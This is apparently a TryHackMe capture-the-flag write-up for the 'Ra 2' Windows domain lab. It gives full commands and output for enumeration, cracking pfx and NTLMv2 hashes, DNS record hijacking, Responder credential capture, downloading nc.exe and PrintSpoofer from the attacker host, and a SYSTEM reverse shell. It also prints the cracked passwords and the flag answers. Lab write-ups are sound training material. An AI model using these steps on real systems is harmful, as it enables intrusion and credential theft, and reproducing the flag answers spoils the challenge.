# Ra 2

Just when they thought their hashes were safe... Ra 2 - The sequel!

[Ra 2](https://tryhackme.com/room/ra2)

## Topic's

- Network Enumeration
- Web Enumeration
- DNS Enumeration
- Brute Forcing (pfx)
- Brute Forcing (NTML)
- Abusing Impersonation Privileges (PrintSpoofer)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Ra 2

**Story**

WindCorp recently had a security-breach. Since then they have hardened their infrastructure, learning from their mistakes. But maybe not enough? You have managed to enter their local network...

Happy Hacking!

Created by @4nqr34z and @theart42

(Give it at least 5 minutes to boot)

```
kali@kali:~/CTFs/tryhackme/Ra 2$ sudo nmap -A -sS -sC -sV -O 10.10.34.115
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 22:11 CEST
Nmap scan report for 10.10.34.115
Host is up (0.061s latency).
Not shown: 978 filtered ports
PORT     STATE SERVICE             VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
80/tcp   open  http                Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://fire.windcorp.thm/
88/tcp   open  kerberos-sec        Microsoft Windows Kerberos (server time: 2020-10-17 20:11:36Z)
135/tcp  open  msrpc               Microsoft Windows RPC
139/tcp  open  netbios-ssn         Microsoft Windows netbios-ssn
389/tcp  open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2020-10-17T20:14:44+00:00; +1s from scanner time.
443/tcp  open  ssl/http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2020-10-17T20:14:41+00:00; +1s from scanner time.
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http          Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2020-10-17T20:14:41+00:00; +1s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap                Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2020-10-17T20:14:44+00:00; +1s from scanner time.
3269/tcp open  ssl/ldap            Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:selfservice.windcorp.thm, DNS:selfservice.dev.windcorp.thm
| Not valid before: 2020-05-29T03:31:08
|_Not valid after:  2028-05-29T03:41:03
|_ssl-date: 2020-10-17T20:14:41+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server       Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: WINDCORP
|   NetBIOS_Domain_Name: WINDCORP
|   NetBIOS_Computer_Name: FIRE
|   DNS_Domain_Name: windcorp.thm
|   DNS_Computer_Name: Fire.windcorp.thm
|   DNS_Tree_Name: windcorp.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2020-10-17T20:14:00+00:00
| ssl-cert: Subject: commonName=Fire.windcorp.thm
| Not valid before: 2020-10-16T20:11:18
|_Not valid after:  2021-04-17T20:11:18
|_ssl-date: 2020-10-17T20:14:44+00:00; +1s from scanner time.
5222/tcp open  jabber              Ignite Realtime Openfire Jabber server 3.10.0 or later
| xmpp-info:
|   STARTTLS Failed
|   info:
|     unknown:
|
|     stream_id: 6j0chmpuz9
|     xmpp:
|       version: 1.0
|     features:
|
|     errors:
|       invalid-namespace
|       (timeout)
|     capabilities:
|
|     auth_mechanisms:
|
|_    compression_methods:
5269/tcp open  xmpp                Wildfire XMPP Client
| xmpp-info:
|   STARTTLS Failed
|   info:
|     auth_mechanisms:
|
|     xmpp:
|
|     features:
|
|     errors:
|       (timeout)
|     capabilities:
|
|     unknown:
|
|_    compression_methods:
7070/tcp open  http                Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
7443/tcp open  ssl/http            Jetty 9.4.18.v20190429
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
7777/tcp open  socks5              (No authentication; connection failed)
| socks-auth-info:
|_  No authentication
9090/tcp open  zeus-admin?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Oct 2020 20:11:36 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Oct 2020 20:11:42 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   JavaRMI, drda, ibm-db2-das, informix:
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   SqueezeCenter_CLI:
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   WMSRequest:
|     HTTP/1.1 400 Illegal character CNTL=0x1
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x1</pre>
9091/tcp open  ssl/xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP:
|     HTTP/1.1 400 Illegal character CNTL=0x0
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
|   GetRequest:
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Oct 2020 20:11:59 GMT
|     Last-Modified: Fri, 31 Jan 2020 17:54:10 GMT
|     Content-Type: text/html
|     Accept-Ranges: bytes
|     Content-Length: 115
|     <html>
|     <head><title></title>
|     <meta http-equiv="refresh" content="0;URL=index.jsp">
|     </head>
|     <body>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Sat, 17 Oct 2020 20:11:59 GMT
|     Allow: GET,HEAD,POST,OPTIONS
|   Help:
|     HTTP/1.1 400 No URI
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 49
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: No URI</pre>
|   RPCCheck:
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest:
|     HTTP/1.1 400 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Unknown Version</pre>
|   SSLSessionReq:
|     HTTP/1.1 400 Illegal character CNTL=0x16
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 70
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x16</pre>
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Not valid before: 2020-05-01T08:39:00
|_Not valid after:  2025-04-30T08:39:00
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port53-TCP:V=7.80%I=7%D=10/17%Time=5F8B4FFC%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
SF:\x04bind\0\0\x10\0\x03");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9090-TCP:V=7.80%I=7%D=10/17%Time=5F8B4FF8%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x20Oct\x20
SF:2020\x2020:11:36\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x202020\
SF:x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges:\x20b
SF:ytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></title>\n<m
SF:eta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n</head>
SF:\n<body>\n</body>\n</html>\n\n")%r(JavaRMI,C3,"HTTP/1\.1\x20400\x20Ille
SF:gal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-
SF:8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\
SF:x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0<
SF:/pre>")%r(WMSRequest,C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CN
SF:TL=0x1\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nContent-Leng
SF:th:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1>
SF:<pre>reason:\x20Illegal\x20character\x20CNTL=0x1</pre>")%r(ibm-db2-das,
SF:C3,"HTTP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Typ
SF:e:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnecti
SF:on:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illeg
SF:al\x20character\x20CNTL=0x0</pre>")%r(SqueezeCenter_CLI,9B,"HTTP/1\.1\x
SF:20400\x20No\x20URI\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\n
SF:Content-Length:\x2049\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message
SF:\x20400</h1><pre>reason:\x20No\x20URI</pre>")%r(informix,C3,"HTTP/1\.1\
SF:x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/htm
SF:l;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r
SF:\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20characte
SF:r\x20CNTL=0x0</pre>")%r(drda,C3,"HTTP/1\.1\x20400\x20Illegal\x20charact
SF:er\x20CNTL=0x0\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCont
SF:ent-Length:\x2069\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x20
SF:400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x0</pre>")%r(HTTP
SF:Options,56,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x20Oct\x20202
SF:0\x2020:11:42\x20GMT\r\nAllow:\x20GET,HEAD,POST,OPTIONS\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9091-TCP:V=7.80%T=SSL%I=7%D=10/17%Time=5F8B500F%P=x86_64-pc-linux-g
SF:nu%r(GetRequest,11D,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sat,\x2017\x20O
SF:ct\x202020\x2020:11:59\x20GMT\r\nLast-Modified:\x20Fri,\x2031\x20Jan\x2
SF:02020\x2017:54:10\x20GMT\r\nContent-Type:\x20text/html\r\nAccept-Ranges
SF::\x20bytes\r\nContent-Length:\x20115\r\n\r\n<html>\n<head><title></titl
SF:e>\n<meta\x20http-equiv=\"refresh\"\x20content=\"0;URL=index\.jsp\">\n<
SF:/head>\n<body>\n</body>\n</html>\n\n")%r(HTTPOptions,56,"HTTP/1\.1\x202
SF:00\x20OK\r\nDate:\x20Sat,\x2017\x20Oct\x202020\x2020:11:59\x20GMT\r\nAl
SF:low:\x20GET,HEAD,POST,OPTIONS\r\n\r\n")%r(RTSPRequest,AD,"HTTP/1\.1\x20
SF:400\x20Unknown\x20Version\r\nContent-Type:\x20text/html;charset=iso-885
SF:9-1\r\nContent-Length:\x2058\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20
SF:Message\x20400</h1><pre>reason:\x20Unknown\x20Version</pre>")%r(RPCChec
SF:k,C7,"HTTP/1\.1\x20400\x20Illegal\x20character\x20OTEXT=0x80\r\nContent
SF:-Type:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2071\r\nConn
SF:ection:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20I
SF:llegal\x20character\x20OTEXT=0x80</pre>")%r(DNSVersionBindReqTCP,C3,"HT
SF:TP/1\.1\x20400\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20
SF:text/html;charset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x2
SF:0close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20
SF:character\x20CNTL=0x0</pre>")%r(DNSStatusRequestTCP,C3,"HTTP/1\.1\x2040
SF:0\x20Illegal\x20character\x20CNTL=0x0\r\nContent-Type:\x20text/html;cha
SF:rset=iso-8859-1\r\nContent-Length:\x2069\r\nConnection:\x20close\r\n\r\
SF:n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20Illegal\x20character\x20
SF:CNTL=0x0</pre>")%r(Help,9B,"HTTP/1\.1\x20400\x20No\x20URI\r\nContent-Ty
SF:pe:\x20text/html;charset=iso-8859-1\r\nContent-Length:\x2049\r\nConnect
SF:ion:\x20close\r\n\r\n<h1>Bad\x20Message\x20400</h1><pre>reason:\x20No\x
SF:20URI</pre>")%r(SSLSessionReq,C5,"HTTP/1\.1\x20400\x20Illegal\x20charac
SF:ter\x20CNTL=0x16\r\nContent-Type:\x20text/html;charset=iso-8859-1\r\nCo
SF:ntent-Length:\x2070\r\nConnection:\x20close\r\n\r\n<h1>Bad\x20Message\x
SF:20400</h1><pre>reason:\x20Illegal\x20character\x20CNTL=0x16</pre>");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: FIRE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-10-17T20:14:02
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   58.13 ms 10.8.0.1
2   63.12 ms 10.10.34.115

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 221.96 seconds
```

```
kali@kali:~/CTFs/tryhackme/Ra 2$ nikto -h 10.10.34.115
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.34.115
+ Target Hostname:    10.10.34.115
+ Target Port:        80
+ Start Time:         2020-10-17 22:18:21 (GMT2)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: https://fire.windcorp.thm/
+ Retrieved x-aspnet-version header: 4.0.30319
+ No CGI Directories found (use '-C all' to force check all possible dirs)
```

![](./2020-10-17_22-19.png)

```
kali@kali:~/CTFs/tryhackme/Ra 2$ dig windcorp.thm any @10.10.34.115

; <<>> DiG 9.16.2-Debian <<>> windcorp.thm any @10.10.34.115
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 57046
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 5, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;windcorp.thm.                  IN      ANY

;; ANSWER SECTION:
windcorp.thm.           600     IN      A       10.10.34.115
windcorp.thm.           600     IN      A       10.10.61.88
windcorp.thm.           3600    IN      NS      fire.windcorp.thm.
windcorp.thm.           3600    IN      SOA     fire.windcorp.thm. hostmaster.windcorp.thm. 291 900 600 86400 3600
windcorp.thm.           86400   IN      TXT     "THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}"

;; ADDITIONAL SECTION:
fire.windcorp.thm.      3600    IN      A       10.10.34.115
fire.windcorp.thm.      3600    IN      A       192.168.112.1

;; Query time: 40 msec
;; SERVER: 10.10.34.115#53(10.10.34.115)
;; WHEN: Sat Oct 17 22:15:18 CEST 2020
;; MSG SIZE  rcvd: 318
```

```
kali@kali:~/CTFs/tryhackme/Ra 2$ sudo /opt/dirsearch/dirsearch.py -u https://fire.windcorp.thm -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 100 -x 400
  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 220520

Error Log: /opt/dirsearch/logs/errors-20-10-17_22-17-32.log

Target: https://fire.windcorp.thm

Output File: /opt/dirsearch/reports/fire.windcorp.thm/_20-10-17_22-17-34.txt

[22:17:34] Starting:
[22:17:39] 301 -  153B  - /img  ->  https://fire.windcorp.thm/img/
[22:17:42] 301 -  153B  - /css  ->  https://fire.windcorp.thm/css/
[22:17:47] 301 -  156B  - /vendor  ->  https://fire.windcorp.thm/vendor/
[22:18:03] 301 -  153B  - /IMG  ->  https://fire.windcorp.thm/IMG/
[22:18:32] 301 -  153B  - /CSS  ->  https://fire.windcorp.thm/CSS/
[22:18:38] 301 -  153B  - /Img  ->  https://fire.windcorp.thm/Img/
[22:21:55] 302 -  165B  - /powershell  ->  /powershell/default.aspx?ReturnUrl=%2fpowershell
CTRL+C detected: Pausing threads, please wait...
[e]xit / [c]ontinue: e

Canceled by the user
```

```
kali@kali:~/CTFs/tryhackme/Ra 2$ sudo /opt/dirsearch/dirsearch.py -u https://selfservice.dev.windcorp.thm -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -t 100 -x 400[sudo] password for kali:

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 220520

Error Log: /opt/dirsearch/logs/errors-20-10-17_22-27-02.log

Target: https://selfservice.dev.windcorp.thm

Output File: /opt/dirsearch/reports/selfservice.dev.windcorp.thm/_20-10-17_22-27-02.txt

[22:27:02] Starting:
[22:27:14] 301 -  167B  - /backup  ->  https://selfservice.dev.windcorp.thm/backup/
[22:27:19] 301 -  167B  - /Backup  ->  https://selfservice.dev.windcorp.thm/Backup/
CTRL+C detected: Pausing threads, please wait...
```

[https://selfservice.dev.windcorp.thm/backup/](https://selfservice.dev.windcorp.thm/backup/)

```
kali@kali:~/CTFs/tryhackme/Ra 2$ /usr/share/john/pfx2john.py cert.pfx > hash
kali@kali:~/CTFs/tryhackme/Ra 2$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 256 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ganteng          (cert.pfx)
1g 0:00:00:00 DONE (2020-10-17 22:34) 5.882g/s 12047p/s 12047c/s 12047C/s clover..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed

kali@kali:~/CTFs/tryhackme/Ra 2$ openssl pkcs12 -in cert.pfx -nocerts -out key.pem -nodes
Enter Import Password:
kali@kali:~/CTFs/tryhackme/Ra 2$ openssl pkcs12 -in cert.pfx -out crt.pem -clcerts -nokeys
Enter Import Password:
kali@kali:~/CTFs/tryhackme/Ra 2$ nsupdate
> server 10.10.34.115
> update delete selfservice.windcorp.thm
> send
> update add selfservice.windcorp.thm 1234 A 10.8.106.222
> send
> quit
kali@kali:~/CTFs/tryhackme/Ra 2$ dig selfservice.windcorp.thm @10.10.34.115

; <<>> DiG 9.16.2-Debian <<>> selfservice.windcorp.thm @10.10.34.115
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26719
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;selfservice.windcorp.thm.      IN      A

;; ANSWER SECTION:
selfservice.windcorp.thm. 1234  IN      A       10.8.106.222

;; Query time: 36 msec
;; SERVER: 10.10.34.115#53(10.10.34.115)
;; WHEN: Sat Oct 17 22:37:09 CEST 2020
;; MSG SIZE  rcvd: 69

kali@kali:~/CTFs/tryhackme/Ra 2$
```

```
kali@kali:~/CTFs/tryhackme/Ra 2$ ls /usr/share/responder/certs
gen-self-signed-cert.sh  responder.crt  responder.key
kali@kali:~/CTFs/tryhackme/Ra 2$ sudo cp *.pem /usr/share/responder/certs
[sudo] password for kali:
kali@kali:~/CTFs/tryhackme/Ra 2$ ls /usr/share/responder/certs
crt.pem  gen-self-signed-cert.sh  key.pem  responder.crt  responder.key

kali@kali:~/CTFs/tryhackme/Ra 2$ sudo nano /etc/responder/Responder.conf
```

```
kali@kali:~/CTFs/tryhackme/Ra 2$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.0.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.8.106.222]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']



[+] Listening for events...
[HTTP] NTLMv2 Client   : 10.10.34.115
[HTTP] NTLMv2 Username : WINDCORP\edwardle
[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:9ed1e3cb414d26d7:CF1983C3F404EAD38CC0CB91BBAFA09F:0101000000000000D61E7D30C8A4D601DB7E9DBC059F4E60000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000010000000020000099A10F5EFB667547433C87F28386E0CEA33BC58B6355A26FBD43919D5CA98B790A00100012C690EF73A24A276DC3EDC54B8CC48409003A0048005400540050002F00730065006C00660073006500720076006900630065002E00770069006E00640063006F00720070002E00740068006D000000000000000000
```

```
kali@kali:~/CTFs/tryhackme/Ra 2$ john edwardle.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!Angelus25!      (edwardle)
1g 0:00:00:25 DONE (2020-10-17 22:59) 0.03883g/s 556936p/s 556936c/s 556936C/s !SkicA!..!@#fuck
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

`edwardle:!Angelus25!`

[https://fire.windcorp.thm/powershell/en-US/logon.aspx?ReturnUrl=%2fpowershell](https://fire.windcorp.thm/powershell/en-US/logon.aspx?ReturnUrl=%2fpowershell)

![](./2020-10-17_23-01.png)

```ps1
Windows PowerShell

Copyright (C) 2016 Microsoft Corporation. All rights reserved.



PS C:\Users\edwardle.WINDCORP\Documents>

cd ..\Desktop

PS C:\Users\edwardle.WINDCORP\Desktop>

dir





    Directory: C:\Users\edwardle.WINDCORP\Desktop





Mode                LastWriteTime         Length Name

----                -------------         ------ ----

-a----        5/31/2020  10:12 AM             47 Flag 2.txt





PS C:\Users\edwardle.WINDCORP\Desktop>

type "Flag 2.txt"

THM{8a1d460dfe345f8edd09d45ae00e5c1c14d12c89}

PS C:\Users\edwardle.WINDCORP\Desktop> whoami /priv



PRIVILEGES INFORMATION

----------------------



Privilege Name                Description                               State

============================= ========================================= =======

SeMachineAccountPrivilege     Add workstations to domain                Enabled

SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled

PS C:\Users\edwardle.WINDCORP\Desktop>
```

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://10.8.106.222/nc.exe","C:\Users\edwardle.WINDCORP\Desktop")
```

`Invoke-WebRequest -Uri "http://10.8.106.222/nc.exe" -OutFile "C:\Users\edwardle.WINDCORP\Documents\nc.exe"`

`Invoke-WebRequest -Uri "http://10.8.106.222/PrintSpoofer.exe" -OutFile "C:\Users\edwardle.WINDCORP\Documents\PrintSpoofer.exe"`

```
PS C:\Users\edwardle.WINDCORP\Documents>

Invoke-WebRequest -Uri "http://10.8.106.222/nc.exe" -OutFile "C:\Users\edwardle.WINDCORP\Documents\nc.exe"

PS C:\Users\edwardle.WINDCORP\Documents>

Invoke-WebRequest -Uri "http://10.8.106.222/PrintSpoofer.exe" -OutFile "C:\Users\edwardle.WINDCORP\Documents\PrintSpoof

er.exe"

PS C:\Users\edwardle.WINDCORP\Documents>

dir





    Directory: C:\Users\edwardle.WINDCORP\Documents





Mode                LastWriteTime         Length Name

----                -------------         ------ ----

-a----       10/17/2020   2:33 PM          59392 nc.exe

-a----       10/17/2020   2:34 PM          27136 PrintSpoofer.exe

-a----         6/1/2020   4:20 AM            253 surfsup.cmd





PS C:\Users\edwardle.WINDCORP\Documents>
```

```
S C:\Users\edwardle.WINDCORP\Documents>

.\PrintSpoofer.exe -c ".\nc.exe 10.8.106.222 9001 -e cmd"

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().

[+] CreateProcessWithTokenW() OK

PS C:\Users\edwardle.WINDCORP\Documents>
```

```
C:\Windows\system32>cd C:\
cd C:\

C:\>cd Users
cd Users

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84E1-0562

 Directory of C:\Users\Administrator\Desktop

06/01/2020  10:36 AM    <DIR>          .
06/01/2020  10:36 AM    <DIR>          ..
05/31/2020  02:32 AM                47 Flag 3.txt
               1 File(s)             47 bytes
               2 Dir(s)  43,815,673,856 bytes free

C:\Users\Administrator\Desktop>type "Flag 3.txt"
type "Flag 3.txt"
THM{9a8b9f4f3af2bce68885106c1c8473ab85e0eda0}
```

1. What is flag 1?

`THM{Allowing nonsecure dynamic updates is a significant security vulnerability because updates can be accepted from untrusted sources}`

2. What is flag 2?

